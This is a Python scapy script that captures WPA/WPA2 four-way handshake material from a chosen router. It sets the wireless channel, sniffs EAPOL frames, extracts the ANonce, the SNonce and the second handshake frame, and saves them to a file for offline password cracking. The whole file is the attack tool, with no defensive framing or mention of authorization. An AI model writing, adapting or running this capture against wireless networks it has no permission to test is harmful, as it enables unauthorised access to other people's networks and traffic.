from scapy.all import Dot11, EAPOL, sniff
import os
import subprocess
from collections import defaultdict

INTERFACE = "wlan0"
TARGET_BSSID = input("enter router mac").lower()
OUTPUT_FILE = "handshake_channel1.txt"
CHANNEL = "1"

handshake_data = defaultdict(lambda: {"anonce": None, "snonce": None, "frame2_hex": None})

print(f"starting...")
subprocess.run(["sudo", "iw", "dev", INTERFACE, "set", "channel", CHANNEL])#set channel

def packet_handler(pkt):
    if pkt.haslayer(Dot11) and pkt.haslayer(EAPOL):
        addr1 = str(pkt.addr1).lower()
        addr2 = str(pkt.addr2).lower()

        if addr1 == TARGET_BSSID:
            client_mac = addr2
            is_from_ap = False
        elif addr2 == TARGET_BSSID:
            client_mac = addr1
            is_from_ap = True
        else:
            return

        eapol_bytes = bytes(pkt[EAPOL])
        if len(eapol_bytes) < 99:
            return

        if is_from_ap:
            nonce_candidate = eapol_bytes[17:49].hex()

            if nonce_candidate != "0" * 64:
                handshake_data[client_mac]["anonce"] = nonce_candidate
                print(f"found anonce")

        else:
            nonce_candidate = eapol_bytes[17:49].hex()
            if nonce_candidate != "0" * 64:
                handshake_data[client_mac]["snonce"] = nonce_candidate
                handshake_data[client_mac]["frame2_hex"] = eapol_bytes.hex()
                print("nonce")

        # differs ap from router

                data = handshake_data[client_mac]
                if data["anonce"] and data["snonce"] and data["frame2_hex"]:
                    print(f"\nSuccess!")

                    with open(OUTPUT_FILE, "w") as f:
                        f.write(f"{TARGET_BSSID}\n")
                        f.write(f"{client_mac}\n")
                        f.write(f"{data['anonce']}\n")
                        f.write(f"{data['snonce']}\n")
                        f.write(f"{data['frame2_hex']}\n")

                    print(f"information is in:  {OUTPUT_FILE}")
                    os._exit(0)

if __name__ == "__main__":
    try:
        sniff(iface=INTERFACE, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print("\nStopped by user.")